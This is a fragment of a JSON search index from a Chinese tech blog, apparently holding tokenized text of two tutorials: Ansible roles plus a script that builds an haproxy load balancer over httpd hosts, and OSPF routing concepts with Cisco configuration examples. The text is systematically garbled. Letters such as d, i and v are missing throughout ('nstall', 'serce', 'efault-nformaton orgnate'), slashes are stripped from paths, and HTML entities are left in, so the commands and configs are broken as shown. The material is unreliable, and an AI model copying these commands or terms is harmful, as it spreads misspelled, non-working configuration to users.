l","│","│","├","─","─","nstall",".","yml","│","│","├","─","─","man",".","yml","│","│","├","─","─","restart",".","yml","│","│","├","─","─","start",".","yml","│","│","├","─","─","templ",".","yml","│","│","└","─","─","user",".","yml","│","└","─","─","*","templates","│","└","─","─","http",".","conf",".","j","2","r",":","roles",",","http",",","task",",","templates","2","、","文件","内容","[","root","@","noe","01",".","ansble","]","#","cat","http","_","role",".","yml","-","hosts",":","all","remote","_","user",":","root","roles",":","-","role",":","http","[","root","@","noe","01","tasks","]","#","cat","group",".","yml","-","name",":","a","group","group",":","name","=","http","g","=","110","system","=","yes","[","root","@","noe","01","tasks","]","#","cat","user",".","yml","-","name",":","a","user","user",":","name","=","http","u","=","110","system","=","yes","[","root","@","noe","01","tasks","]","#","cat","nstall",".","yml","-","name",":","nstall","http","yum",":","name","=","http","[","root","@","noe","01","tasks","]","#","cat","templ",".","yml","-","name",":","copy","confg","template",":","src","=","http",".","conf",".","j","2","est","=","etchttpconfhttp",".","conf","[","root","@","noe","01","tasks","]","#","cat","start",".","yml","-","name",":","start","serce","serce",":","name","=","http","state","=","starte","templates","下","的","文件","就是","复制","的","etchttpconfhttp",".","conf","，","并","改名","为","http",".","conf",".","j","2","调用","别的","角色","的","任务","man",".","yml","-","nclue",":","nstall","package","-","nclue",":","roleshttptaskscopyfle",".","yml","调用","多","个","角色","、","启用","标签","、","判断","语句","[","root","@","noe","01",".","ansble","]","#","cat","some",".","yml","-","hosts",":","all","remote","_","user",":","root","roles",":","-","&","#","123",";","role",":","http",",","tags",":","[","'","web","'",",","'","http","'","]",",","when",":","ansble","_","strbuton","_","major","_","erson","=","=","\"","7","\"","&","#","125",";","#","加","判断","-","role",":","ngnx","#","这里","可以","调用","多","个","角色","-","&","#","123",";","role",":","sftp",",","tags",":","[","'","web","'",",","'","sftp","'","]","&","#","125",";","#","加","标签","标签","执行","ansble","-","play","-","t","sftp","some",".","yml","Ansble","搭建","Haproxy","主机","IP","功能","noe","01","192.168.70.10","ansble","noe","02","192.168.70.20","haproxy","noe","03","192.168.70.30","http","noe","04","192.168.70.40","http","#","!","bnbashyum","-","y","nstall","ansbleIP","2","=","\"","192.168.70.20","\"","IP","3","=","\"","192.168.70.30","\"","IP","4","=","\"","192.168.70.40","\"","rm","-","rf","etcansblehosts","echo","\"","[","webs","]","\"","etcansblehosts","echo","\"","$","IP","3","SITE","=","web","1","\"","etcansblehosts","echo","\"","$","IP","4","SITE","=","web","2","\"","etcansblehosts","echo","\"","[","lb","]","\"","etcansblehosts","echo","\"","$","IP","2","\"","etcansblehosts","rm","-","rf","root",".","ansble","*","mkr","-","p","root",".","ansbleroles","&","#","123",";","http",",","haproxy","&","#","125",";","&","#","123",";","tasks",",","templates","&","#","125",";","touch","root",".","ansbleroles","&","#","123",";","http",",","haproxy","&","#","125",";","tasksnstall",".","ymltouch","root",".","ansbleroles","&","#","123",";","http",",","haproxy","&","#","125",";","taskstempla",".","ymltouch","root",".","ansbleroles","&","#","123",";","http",",","haproxy","&","#","125",";","tasksstart",".","ymltouch","root",".","ansbleroles","&","#","123",";","http",",","haproxy","&","#","125",";","tasksman",".","ymlcat","root",".","ansbleroleshttptasksnstall",".","yml","'","EOF","'","-","name",":","nstall","http","yum",":","name","=","httpEOFecho","\"","ths","s","&","#","123",";","&","#","123",";","SITE","&","#","125",";","&","#","125",";","\"","root",".","ansbleroleshttptemplatesnex",".","html",".","j","2","cat","root",".","ansbleroleshttptaskstempla",".","yml","'","EOF","'","-","name",":","copy","nex",".","html","template",":","src","=","root",".","ansbleroleshttptemplatesnex",".","html",".","j","2","est","=","arwwwhtmlnex",".","htmlEOFcat","root",".","ansbleroleshttptasksstart",".","yml","'","EOF","'","-","name",":","start","serce","serce",":","name","=","http","state","=","starteEOFcat","root",".","ansbleroleshttptasksman",".","yml","'","EOF","'","-","nclue",":","nstall",".","yml","-","nclue",":","templa",".","yml","-","nclue",":","start",".","ymlEOFcat","root",".","ansbleroleshaproxytasksnstall",".","yml","'","EOF","'","-","name",":","nstall","haproxy","yum",":","name","=","haproxyEOFcat","root",".","ansbleroleshaproxytemplateshaproxy",".","cfg",".","j","2","'","EOF","'","global","log","127.0.0.1","local","2","chroot","arlbhaproxy","pfle","arrunhaproxy",".","p","maxconn","4000","user","haproxy","group","haproxy","aemon","stats","socket","arlbhaproxystatsefaults","moe","http","log","global","opton","httplog","opton","ontlognull","opton","http","-","serer","-","close","opton","forwarfor","except","127.0.0.08","opton","respatch","retres","3","tmeout","http","-","request","10","s","tmeout","queue","1","m","tmeout","connect","10","s","tmeout","clent","1","m","tmeout","serer","1","m","tmeout","http","-","keep","-","ale","10","s","tmeout","check","10","s","maxconn","3000","fronten","man","*",":","8080","acl","url","_","statc","path","_","beg","-","statc","mages","jaascrpt","stylesheets","acl","url","_","statc","path","_","en","-",".","jpg",".","gf",".","png",".","css",".","js","use","_","backen","statc","f","url","_","statc","efault","_","backen","appbacken","statc","balance","rounrobn","serer","statc","127.0.0.1",":","4331","checkbacken","app","balance","rounrobnEOFecho","-","e","\"","serer","web","1","$","IP","3",":","80","check","\"","root",".","ansbleroleshaproxytemplateshaproxy",".","cfg",".","j","2","echo","-","e","\"","serer","web","2","$","IP","4",":","80","check","\"","root",".","ansbleroleshaproxytemplateshaproxy",".","cfg",".","j","2","cat","root",".","ansbleroleshaproxytaskstempla",".","yml","'","EOF","'","-","name",":","copy","nex",".","html","template",":","src","=","root",".","ansbleroleshaproxytemplateshaproxy",".","cfg",".","j","2","est","=","arwwwhtmlnex",".","html","est","=","etchaproxyhaproxy",".","cfgEOFcat","root",".","ansbleroleshaproxytasksstart",".","yml","'","EOF","'","-","name",":","start","serce","serce",":","name","=","haproxy","state","=","starteEOFcat","root",".","ansbleroleshaproxytasksman",".","yml","'","EOF","'","-","nclue",":","nstall",".","yml","-","nclue",":","templa",".","yml","-","nclue",":","start",".","ymlEOFcat","root",".","ansblelb","_","role",".","yml","'","EOF","'","-","-","-","-","hosts",":","webs","remote","_","user",":","root","roles",":","-","role",":","http","-","hosts",":","lb","remote","_","user",":","root","roles",":","-","role",":","haproxyEOFc","root",".","ansbleansble","-","playbook","-","$","1","lb","_","role",".","ymlecho","\"","Please","Curl","$","IP","2",":","8080","\""],"url":"http://ymlog.cn/2020/02/24/Ansible/","title":"Ansible","content":"简介运维自动化发展历程：\n\n内容\n\n运维自动化发展历程及技术\nAnsible命令使用\nAnsible常用模块详解\nYAML语法简介\nAnsible playbook基础\nPlaybook变量、tags、handlers使用\nPlayb...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/","name":"中间件"},"date":"2020-02-24 14:00:36"},{"word":["OSPF","距离","矢量","路由","协议","​","路由器","相互之间","只","更新","路由","表","信息","，","并且","逐条","更新","，","依照","传闻","的","更新","，","任何","一台","路由器","对路","由","表","的","更改","，","都","将","直接","影响到","下游","。","链路","状态","路由","协议","​","每","台","路由器","都","选择","一个","IP","地址","作为","自己","的","名字","，","（","Router","-","ID","）","​","将","自己","的","每个","接口","的","网络","信息","，","带宽","信息","进行","描述","，","做成","链路","状态","信息","​","将","Router","-","ID","和","链路","状态","一起","发送","给","自己","的","邻居","，","并且","也","帮助","其他","设备","转发","​","最终","会","得到","全","网","所有","路由器","的","链路","状态","信息","，","通过","分析","可以","得到","全","网","拓扑","图","​","使用","最","短","路径","算法","（","SPF","）","，","得到","去往","每个","目的地","的","最","短","路线","，","得","到","路由","表","简介","ospf","在","Csco","设备","中的","管理","距离","为","120","不","使用","传输","层","的","TCPUDP","进行","数据","封装","，","更新","消息","直接","放","在","网络","层","后","，","协议","号","为","89","OSPF","使用","触发","更新","的","机制","，","和","邻居","共享","链路","状态","信息","，","而不是","共享","路由","信息","OSPF","有","邻居","的","概念","，","使用","Hello","消息","来","建立","和","维护","邻居","，","在","以太网","中","，","10","s","更新","一次","，","40","s","没收","到","就","判定","邻居","失效","。","OSPF","建立","邻居","有","7个","状态","OSPF","使用","224.0.0.5","和","224.0.0.6","来","更新","LSA","(","链路","状态","通告",")","ospf","宣告","的","环回","口","不管","子网掩码","是多少","，","传播","的","时候","都","时","32位","名词","介绍","Router","-","ID","：","相当于","路由器","的","名字","，","因","为","需要","靠","Router","-","ID","去","辨识","每个","节点","，","所以","在","一个","网络","中","不允许","出现","Router","-","ID","一样","。","Router","-","ID","会","以","稳定性","作为","第一","要素","。","1","、","Router","-","ID","会","优先","选择","路由器","LoopBack","接口","的","IP","地址","，","如果","有","多","个","选择","数值","，","选择","最大","的","。","2","、","Router","-","ID","在","没","有","LoopBack","的","情况","下","，","会","选择","物理","接口","IP","数值","最大","的","，","注意","：","这个","接口","必","须要","是","UP","状态","3","、","Router","-","ID","允许","手动","指定","，","但","往往","不能","即使","生效","，","除非","重","启","，","不然","还是","稳定","保持","不变","区域","：","Area","，","由于","每","台","路由器","都","有","全","网","的","拓扑","，","如果","这个","网络","比较","庞大","，","那么","任何","一个","网段","的","变化","，","都会","导致","OSPF","路由器","中","链路","状态","数据库","的","数据","发生","变化","，","从而","触发","路由器","对","所","有的","目的地","最佳","路线","进行","重","算","。","为了","节约","资源","和","加快","路由器","运行","速度","，","所以","OSPF","可以","进行","区域","划分","，","每","台","路由器","只","需要","计算","本","区域","的","拓扑","。","对于","其他","区域","的","网段","，","只","需要","知道","怎么","离开","本","区域","就","行","了","。","OSPF","有","两种","区域","，","一种","是","骨干","区域","，","区域","号","为","0","，","这个","是","固定","的","，","只要","是","骨干","区域","，","区域","号","必须","是","0","，","还有","一种","是非","骨干","区域","，","非","骨干","区域","的","区域","号","除了","0","都","可以","。","非","骨干","区域","必须","和","骨干","区域","相连","，","在","正常","情况","下","，","所","有的","区域","都","可以","学习","到","全","网","所","有的","路由","条目","，","在","人为","优化","的","情况","下","，","可以","让","非","骨干","区域","只","学习","到","本","区域","的","路由","，","去","其他","区域","从","默认","路由","走","，","从而","精简","路由","表","。","邻居","建立","过程","own","表示","OSPF","启动","了","，","由于","某些","原因","，","还","没","开始","发送","Hello","nt","表示","收到","了","对方","发给","我","的","Hello","消息","，","但是","没有","在","对方","的","Hello","消息","中","，","看","的","自","己","的","Router","-","ID","2","-","way","在","收到","对方","发给","我","的","Router","-","ID","中","发现","了","自己","的","Router","-","ID","开始","选举","谁","做","指定","路由器","DR","exstart","（","预","开始","）","开始","选举","谁","来","主导","这个","链路","状态","信息","交换","的","过程","，","选举","（","Slae","，","Master","）","注意","，","此","阶段","互相","传递","的","消息","格式","是","链路","状态","数据库","摘要","（","但是","内容","为","空","）","。","exchange","（","预交","换","）","由","Slae","发送","自己","的","链路","状态","数据","的","摘要","给","Master","，","由","Master","确认","之后","再","将","Slae","需要","的","链路","状态","信息","发","回去","loang","开始","发送","链路","状态","请求","，","然后","接收","对方","发送","的","完整","链路","状态","信息","Full","完成","当前","阶段","的","链路","状态","数据库","同步","，","之后","只","需要","维持","邻居","关系","和","触发","更新","Neghbor","ID","Pr","State","Dea","Tme","Aress","Interface","3.3.3.3","1","FULLDR","00",":","00",":","37","192.168.23.3","Ethernet","00","Neghbor","_","ID",":","邻居","表里","记录","了","邻居","的","Router","-","IDPr",":","选举","DR","和","BDR","的","用","的","优先级","，","默认","是","1","State",":","邻居","建立","过程","中的","状态","和","角色","[","own",",","nt",",","2","-","way",",","exstart",",","exchange",",","loang",",","full","DR",",","BDR",",","DRother","]","Dea","_","Tme",":","邻居","的","死亡","计时","40","s","，","每当","收到","邻居","hello","包","的","时候","，","就","重置","，","计时","到","0","，","就","删除","邻居","Aress",":","建立","邻居","的","IPInterface",":","建立","邻居","的","接口","DR","和","BDRshow","p","ospf","nterface","e","00","查看","OSPF","接口","信息","，","这个","信息","是","和","OSPF","有关","的","在","多路","访问","的","网络","（","交换机","所在","网络","）","里","，","OSPF","建立","邻居","关系","，","导致","最终","邻居","关系","较","复杂","，","更新","消息","重复","而","多于","，","所以","在","MA","网络","中","，","选举","一个","路由器","作为","指定","路由器","（","DR","）","，","在","非","DR","中","，","再选","一个","BDR","作为","备份","。","当","任何","的","更","新","来","临时","，","会","先","发送","给","DB","和","BDR","，","再","由","DR","发送","给","所","有的","DRother","路由器","选取","DR","和","BDR","的","时候","，","先","看","优先","级","，","越","大","越优","，","如果","是","0","，","就","不","参与","DR","和","BDR","选举","。","如果","优先级","一样","，","就","看","Router","-","ID","谁","大","，","谁","大","谁","就是","DR","，","不过","必须","在","第一台","设备","启动","后","的","40","s","内","选举","，","超出","这个","时间","，","就","不可以","抢占","DR","和","BDR","。","DR","和","BDR","在","监听","224.0.0.5","和","224.0.0.6","这个","地址","，","DRother","只","监听","224.0.0.5","这个","地址","，","当","需要","更新","的","时候","，","DRother","会","向","224.0.0.6","去","更新","，","DR","会","向","224.0.0.5","去","更新","消息","为","了","让","ospf","网络","快速","收敛","，","可以","考虑","在","合适的","接口","上","配置","p","2","p","网络","类型","，","让","ospf","邻居","不","进行","40","s","等待","信息","查看","路由器","配置","R","1","enconf","tno","p","o","lo","lne","con","0","no","exec","-","tlogg","synho","R","1","nt","lo","0","p","a","1.1.1.1","255.255.255.255","nt","e","00","p","a","192.168.13.1","255.255.255.0","no","shnt","range","e","00",",","lo","0","p","ospf","1","area","1","en","R","2","enconf","tno","p","o","lo","lne","con","0","no","exec","-","tlogg","synho","R","2","nt","lo","0","p","a","2.2.2.2","255.255.255.255","nt","e","00","p","a","192.168.23.2","255.255.255.0","no","shnt","range","e","00",",","lo","0","p","ospf","1","area","1","en","R","3","enconf","tno","p","o","lo","lne","con","0","no","exec","-","tlogg","synho","R","3","nt","lo","0","p","a","3.3.3.3","255.255.255.255","nt","e","01","p","a","192.168.13.3","255.255.255.0","no","shnt","e","02","p","a","192.168.23.3","255.255.255.0","no","shnt","e","00","p","a","192.168.34.3","255.255.255.0","no","shnt","range","e","01","-","2","p","ospf","1","area","1","nt","range","e","00",",","lo","0","p","ospf","1","area","0","en","R","4","enconf","tno","p","o","lo","lne","con","0","no","exec","-","tlogg","synho","R","4","nt","lo","0","p","a","4.4.4.4","255.255.255.255","nt","e","00","p","a","192.168.34.4","255.255.255.0","no","shnt","e","01","p","a","192.168.45.4","255.255.255.0","no","shnt","range","e","00","-","1",",","lo","0","p","ospf","1","area","0","en","R","5","enconf","tno","p","o","lo","lne","con","0","no","exec","-","tlogg","synho","R","5","nt","lo","0","p","a","5.5.5.5","255.255.255.255","nt","e","01","p","a","192.168.45.5","255.255.255.0","no","shnt","e","00","p","a","192.168.56.5","255.255.255.0","no","shnt","range","e","01",",","lo","0","p","ospf","1","area","0","nt","range","e","00","p","ospf","1","area","2","en","R","6","enconf","tno","p","o","lo","lne","con","0","no","exec","-","tlogg","synho","R","6","nt","lo","0","p","a","6.6.6.6","255.255.255.255","nt","e","00","p","a","192.168.56.6","255.255.255.0","no","shnt","range","e","00",",","lo","0","p","ospf","1","area","2","en","当前","路由器","角色","查看","当前","路由器","的","角色","，","此时","R","3","是","ABR","(","Area","Borer","Router",")","$","show","p","protocalsRoutng","Protocol","s","\"","ospf","1","\"","Router","ID","3.3.3.3","#","Router","_","ID","It","s","an","area","borer","router","#","ABR","Number","of","areas","n","ths","router","s","2",".","2","normal","0","stub","0","nssa","Maxmum","path",":","4","#","最大","负载","均衡","路径","DRBDR","查看","当前","网络","信息","，","包括","DR","，","BDR","，","R","1","的","e","00","接口","信息","R","1","#","sh","p","ospf","nt","e","00","Ethernet","00","s","up",",","lne","protocol","s","up","Internet","Aress","192.168.13.124",",","Area","1",",","Attache","a","Interface","Enable","[","区域","为","aera","1","]","Process","ID","1",",","Router","ID","1.1.1.1",",","Network","Type","BROADCAST",",","Cost",":","10","[","网络","类型","：","Broacast","]","[","传输","延迟","1","s","]","[","状态","BDR","]","[","优先级","1","]","$","Transmt","Delay","s","1","sec",",","State","BDR",",","Prorty","1","[","DR","路由器","的","RouterID","]","[","接口","地址","]","$","Desgnate","Router","(","ID",")","3.3.3.3",",","Interface","aress","192.168.13.3","[","BDR","路由器","的","RouterID","]","[","接口","地址","]","$","Backup","Desgnate","router","(","ID",")","1.1.1.1",",","Interface","aress","192.168.13.1","[","时间","间隔","]","$","$","$","$","Tmer","nterals","confgure",",","Hello","10",",","Dea","40",",","Wat","40",",","Retransmt","5","oob","-","resync","tmeout","40","Hello","ue","n","00",":","00",":","05","#","下一次","发送","Hello","包","是什么","时候","Neghbor","Count","s","1",",","Ajacent","neghbor","count","s","1","Ajacent","wth","neghbor","3.3.3.3","(","Desgnate","Router",")","P","2","P","网络","使用","pont","-","to","-","pont","网络","连接","R","5","和","R","6","，","在","P","2","P","网络","内","，","不","选","DR","和","BDR","。","默认","网络","为","Broacast","。","P","2","P","网络","可以","不用","发","组","播","，","就","能","建立","邻居","。","R","5","(","R","6","同理",")",":","nt","e","00","p","ospf","network","pont","-","to","-","pont","但是","，","只","有没有","多路","访问","的","网络","(","网络","不存在","交换机",")","方便","使用","p","2","p","连接","，","不然","就","会","出现","三个","路由器","两两","交替","抢占","邻居","的","现象","，","即","一会","收到","A","的","Hello","包","，","和","A","建立","邻居","，","一会","收到","B","的","Hello","包","，","和","B","建立","邻居","，","等到","A","的","Hello","包","再来","，","因为","P","2","P","网络","只","能","点对点","，","所以","又","只","好","断掉","B","的","邻居","和","A","建立","邻居","，","循环往复","。","链","路数","据","数据库","字段","#","查看","show","p","ospf","atabase","字段","解释","：","Lnk","ID","：","(","lnk","state",")",",","链路","ID","ADV","Router","：","(","aertsng","router",")","发送","LSA","的","路由器","Age","：","正","计时","，","寿命","1","h","，","OSPF","有","周期性","更新","的","行为","，","周期","为","30","mn","，","每","到","30","mn","，","数据库","进行","泛洪","，","将","所有","数据","全部","发出","，","刷新","Age","Seq","：","序列号","，","十六进制","，","序列号","有","新的","就","用","新的","，","OSPF","认为","0","x","80000000","是","错误","的","，","会","先","更新","，","然后","删除","。","类似","RIP","中的","16","跳","。","Checksum","：","校验","，","MTU","分组","发送","的","时候","需要","校验","Lnk","count","：","链","路条","数","LSA","和","多","区域","LSA","（","Lnk","-","State","Aertsement","）","，","链路","状态","通告","：","链路","状态","通告","，","里面","包含","了","路由器","的","ID","和","链路","状态","相关","的","IP","地址","，","带宽","等","信息","。","目前","在","OSPF","内","，","一共","有","11","中","LSA","LSU","（","Lnk","-","State","Aertsement","）","，","链路","状态","更新","：","链路","状态","更新","，","更新","里面","含有","LSA","LSDB","（","Lnk","-","State","Database","）","，","链路","状态","数据库","：","数据库","中","会","记录","每个","LSA","更新","的","路由器","ID","，","会","记录","序列号","，","序列号","用","16","进","制表","示","。","数据库","每个","LSA","一个","计时器","，","这个","计时器","是","LSA","老化","时间","，","正常","情况","下","1","h","就","会","然这","条","LSA","失效","，","但","OSPF","每隔","30","mn","泛洪","会","更新","一次","LSA","。","stub","Stub","（","末梢","区域","）","：","OSPF","如果","不想","让","非","骨干","区域","学习","到","OSPF","_","AS","外","的","条目","，","达到","精简","路由","表","的","目的","，","可","以","在","ABR","上","对","末梢","区域","进行","area","1","stub","配置","，","这样","ABR","就","不会","向","那个","区域","发送","AS","外","的","条目","，","还","会","产生","一条","0.0.0.00","的","路由","，","保障","没有","路由","的","情况","下","，","这个","区域","也","可以","访问","外界","。","本","区域","的","所有","路由器","你","都","别","忘","了","配置","Stub","，","不然","邻居","关系","无法","建立","。","该","区域","不存在","4","、","5","类","LSA","。","stub","no","-","summary","Stub","no","-","summary","：","如果","做到","极致","精简","，","可以","让","末梢","区域","连","OSPF","其他","区域","路由","也不","学习","，","可","以","在","ABR","上","对","末梢","区域","进行","area","1","stub","no","-","summary","。","no","-","summary","只","需要","在","ABR","上","加","。","Stub","no","-","summary","也","被称为","完全","末梢","区域","。","该","区域","不存在","4","、","5","类","LSA","，","以","及","除","了","ABR","默认","路由","三","类","LSA","以外","的","3","类","nssa","NSSA","（","not","so","stub","area","）","：","次","末梢","区域","。","由于","Stub","区域","无法","存","在","4","、","5","类","LSA","，","所以","stub","区域","无法","引入","外部","路由","，","如果","使用","NSSA","区域","来","做","末梢","，","就","看","可以","引入","外部","路由","条目","，","不过","是以","7","类","LSA","的","方式","进入","，","并且","会","在","NSSA","区域","边界","路由器","上","被","转为","5","类","。","area","1","nssa","默认","情况","下","，","NSSA","不会","像","非","骨干","区域","注入","一条","默认","路由","，","不过","可以","手动","注入","一条","默认","路由","的","7","类","LSA","：","area","1","nssa","efault","-","nfor","org","T","-","nssa","T","-","NSSA","（","total","-","not","so","stub","area","）","完全","次","末梢","区域","，","除了","可以","存在","7","类","LSA","引入","外部","路由","以外","，","其他","功能","和","stub","no","-","summary","一致","。","area","1","nssa","no","-","summary","总结","：","·","`","area","1","stub","`","area","1","是","末梢","区域","`","area","1","stub","no","-","summary","`","area","1","是","完全","末梢","区域","`","area","1","nssa","`","area","1","是次","末梢","区域","`","area","1","nssa","efault","-","nfor","-","orgn","`","area","1","是次","末梢","区域","，","并且","通告","默认","路由","`","area","1","nssa","no","-","summary","`","area","1","完全","次","末梢","区域","OSPF","Coes","标识","含义","O","区域","内","的","路由","O","IA","不同","区域","之间","的","路由","OE","1","区域","外","的","路由","(","不是","OSPF","协议","的","路由",")","，","会","累加","METRIC","值","（","默认","20","）","OE","2","区域","外","的","路由","(","不是","OSPF","协议","的","路由",")","，","不","累加","METRIC","值","（","默认","20","）","，","由","外部","重","分布","进来","默认","使用","OE","2","。","ON","1","区域","外","的","路由","，","由","NSSA","的","ASBR","重","发布","进来","的","，","会","累加","Metrc","值","ON","2","区域","外路","由","，","由","NSSA","的","ASBR","重","发布","进来","的","。","NSSA","区域","中的","路由器","没有","LSA","-","5","，","用","LSA","7","算","出","的","external","路由","，","就","标记","为","ON","12","十一种","LSAOSPF","路由器","会","发送","LSA","通告","，","如果","路由器","太多","，","收到","的","通告","就","会","很多","，","在","进行","SPF","算法","的","时候","，","网络","拓扑","图","太大","，","计算","复杂","，","而且","每当","网络","状态","更新","，","都","需要","重复","这样","一次","计算","，","计算","量","庞大","。","收到","的","LSA","通告","太多","了","，","OSPF","路由器","的","负担","很","内部","动荡","会","引起","全","网路","由","器","的","完全","SPF","计算","资源","消耗","过多","，","LSDB","庞大","，","设备","性能","下降","，","影响","数据","转发","每","台","路由器","都","需要","维护","的","路由","表","越来越","大","，","单","区域内","路由","无法","汇总","LSA","类型","代码","描述","1","路由器","LSA","，","本地","路由器","产生","，","用于","描述","自身","的","链路","信息","，","如","接口","、","带宽","、","p","地址","2","网络","LSA","，","由","DR","产生","，","用于","向","全","网","告知","自己","所在","的","局域网","信息","。","3","网络","汇总","LSA","，","ABR","产生","，","将","其他","区域","的","路由","条目","转发","到","本","区域","，","会","丢失","拓扑","信息","4","ASBR","汇总","LSA","，","ASBR","产生","，","告知","本","区域","路由","如何","离开","自治","系统","5","AS","外部","LSA","，","ASBR","产生","，","告知","本","区域","路由器","外面","的","路由","条目","6","组成","员","LSA","7","NSSA","外部","LSA","，","nssa","区域","路由","器重","发布","外界","路由","产生","，","导入","其他","区域","会","被","ABR","修改","为","5","类","LSA","8","外部","属性","LSA","9","Opaque","LSA","（","链路","本地","范围","）","10","Opaque","LSA","（","本地","区域","范围","）","11","Opaque","LSA","（","AS","范围","）","11","类","LSA","—","路由器","LSA","，","每","台","路由器","都会","产生","，","用于","描述","自身","的","接口","状态","。","$","sh","p","ospf","atabase","Router","Lnk","States","(","Area","1",")","Lnk","ID","ADV","Router","Age","Seq","#","Checksum","Lnk","count","1.1.1.1","1.1.1.1","1678","0","x","80000006","0","x","00997","D","22.2.2.2","2.2.2.2","1621","0","x","80000007","0","x","00559","F","23.3.3.3","3.3.3.3","1724","0","x","80000009","0","x","009362","2","路由","链路","状态","表","（","区域","1","）","连接","的","ID","，","从","哪个","路由器","学到","的","，","寿命","，","序列号","，","校验","位","，","链","路数","#","查看","详细","信息","$","sh","p","ospf","atabase","router","1.1.1.1","22","类","LSA","：","网络","LSA","，","由","DR","产生","，","用于","向","全","网","告知","自己","所在","的","局域网","信息","。","R","1","#","sh","p","ospf","atabase","network","192.168.13.3","OSPF","Router","wth","ID","(","1.1.1.1",")","(","Process","ID","1",")","Net","Lnk","States","(","Area","1",")","#","头部","信息","Routng","Bt","Set","on","ths","LSA","n","topology","Base","wth","MTID","0","LS","age",":","56","Optons",":","(","No","TOS","-","capablty",",","DC",")","LS","Type",":","Network","Lnks","Lnk","State","ID",":","192.168.13.3","(","aress","of","Desgnate","Router",")","Aertsng","Router",":","3.3.3.3","LS","Seq","Number",":","80000001","Checksum",":","0","x","7","E","26","Length",":","32","Network","Mask",":","24","#","当前","区域内","的","路由器","Attache","Router",":","3.3.3.3","Attache","Router",":","1.1.1.1","33","类","LSA","—","路由器","汇总","LSA","，","由","ABR","（","区域","边界","路由器","）","产生","，","用来","将","其他","区域","的","路由","进行","汇总","，","然后","转发","到","本","区域","。","ARB","传递","的","是","路由","表","类似的","LSA","，","会","丢失","掉","拓扑","信息","，","所以","区域","之间","是","无法","得知","拓扑","。","R","6","#","sh","p","ospf","atabase","summary","3.3.3.3","44","类","LSA","，","ASBR","汇总","LSA","，","Lnk","state","ASBR","，","由","ABR","产生","，","用来","告知","本","区域","的","路由器","如何","离开","本","OSPF","自治","系统","#","注入","外部","路由","，","并","形成","一条","默认","路由","nt","e","02","p","a","hcpno","shp","ospf","1","area","0","router","ospf","1","efault","-","nformaton","orgnate","always","四","类","LSA","：","Summary","ASB","Lnk","States","(","Area","1",")","R","1","#","sh","p","ospf","atabase","asbr","-","summary","4.4.4.4","55","类","LSA","，","由","ASBR","产生","，","用来","告知","本","区域","的","路由器","外面","的","条目","5","类","LSA","：","Type","-","5","AS","External","Lnk","StatesR","1","#","sh","p","ospf","atabase","external","OSPF","Router","wth","ID","(","1.1.1.1",")","(","Process","ID","1",")","Type","-","5","AS","External","Lnk","States","Routng","Bt","Set","on","ths","LSA","n","topology","Base","wth","MTID","0","LS","age",":","212","Optons",":","(","No","TOS","-","capablty",",","DC",",","Upwar",")","LS","Type",":","AS","External","Lnk","Lnk","State","ID",":","0.0.0.0","(","External","Network","Number",")","Aertsng","Router",":","4.4.4.4","LS","Seq","Number",":","80000001","Checksum",":","0","xFAEC","Length",":","36","Network","Mask",":","0","Metrc","Type",":","2","(","Larger","than","any","lnk","state","path",")","MTID",":","0","Metrc",":","10","Forwar","Aress",":","192.168.70.2","External","Route","Tag",":","1","7","用于","在","NSSA","区域","表示","外界","路由","，","由","NSSA","区域","的","边界","路由","产生","，","发布","到","其他","区域","时","，","会","被","ABR","转换","为","5","类","的","LSA","。","#","需要","在","路由器","上","都","配","好","router","ospf","1","area","1","nssa","#","在","R","1","上","引入","外部","路由","，","也就是","NSSA","区域","的","路由器","上","引入","外部","路由","p","route","11.11.11.11","255.255.255.255","null","0","router","ospf","1","re","st","su","R","2","的","链路","状态","数据库","中","，","11.11.11.11","是","7","类","LSA","Type","-","7","AS","External","Lnk","States","(","Area","1",")","Lnk","ID","ADV","Router","Age","Seq","#","Checksum","Tag","11.11.11.11","1.1.1.1","123","0","x","80000001","0","x","006","BF","6","0","在","NSSA","边界","路由器","，","11.11.11.11","被","转换","为","了","5","类","LSAR","5","的","链路","状态","数据库","Type","-","5","AS","External","Lnk","StatesLnk","ID","ADV","Router","Age","Seq","#","Checksum","Tag","0.0.0.0","4.4.4.4","343","0","x","80000002","0","x","00","F","8","ED","111.11.11.11","3.3.3.3","323","0","x","80000001","0","x","00","C","3","A","0","0","有","五","类","LSA","但","没","有","四","类","的","LSA","一定","是","因为","存在","NSSA","区域","导致","的","。","路由","汇总","由于","OSPF","不","传递","路由","表","信息","，","而是","直接","发送","LSA","信息","，","所以","在","一个","区域内","，","所有","路由器","都","有","本","区域","的","拓扑","，","所以","在","单个","区域内","无法","完成","路由","汇总","。","在","OSPF","中","，","汇总","只能","发生","在","ABR","和","ASBR","上","，","这","两种","路由器","转发","的","路由","表","的","LSA","信息","。","而","其他","路由器","是","转发","拓扑","信息","在","R","4","添加","nt","lo","10","p","a","172.16.1.1","255.255.255.0","nt","lo","20","p","a","172.16.2.1","255.255.255.0","nt","lo","30","p","a","172.16.3.1","255.255.255.0","router","ospf","1","restrbute","connecte","subnets","#","可以","观察到","R","1","、","R","3","、","R","4","等","路由器","都","受到","了","路由","条目","明细","，","现在","在","ASBR","上","对路","由","做","汇总","#","这里","要","注意","，","不能","再","ABR","(","R","3",")","上","对","OSPF","_","as","以外","的","路由","进行","汇总","summary","-","aress","172.16.0.0","255.255.0.0","注入","默认","路由","在","Stub","网络","里","，","注入","默认","路由","无效","，","但是","可以","在","NSSA","网络","注入","。","router","ospf","1","efault","-","nformaton","orgnate","#","这","条","命令","用来","产生","一条","五","类","的","LSA","，","包含","的","是","缺省","路由","信息","。","其它","路由器","收到","这","条","LSA","后","，","会","计算出","缺省","路由","0.0.0.00","。","#","命令","生效","的","条件","是","该","路由器","上","存在","缺省","路由","。","如果","没有","，","而且","仍然","想","发布","这种","LSA","，","要","在","命令","后面","加","always","，","即","efault","-","nformaton","orgnate","always","构造","虚链路","OSPF","路由器","要","成为","ABR","的","条件","，","除了","要","同时","连接","多","个","区域","，","必须","满足","有","一个","接口","连接","area","0","。","虚链路","会","导致","故障","变得","复杂","，","线路","变得","不稳定","，","所以","一般","是","个","临时","解决方案","，","一个","全新","设计","的","网络","架构","里面","虚链路","是","不合理的","。","rtual","-","lnk","是","ospf","自","带","的","虚链路","解决","方式","，","这种","方式","存","在","诸多","问题","，","比如","通过","虚链路","学习","的","LSA","是","DNA","，","含有","DNA","（","o","not","age","）","的","时间","不会","改变","，","这样","会","导致","错误","的","LSA","信息","得不到","更新","，","甚至","虚链路","邻居","关系","都","不需要","Hello","包","来","维持","。","R","2","：","router","ospf","1","area","1","rtual","-","lnk","3.3.3.3","area","1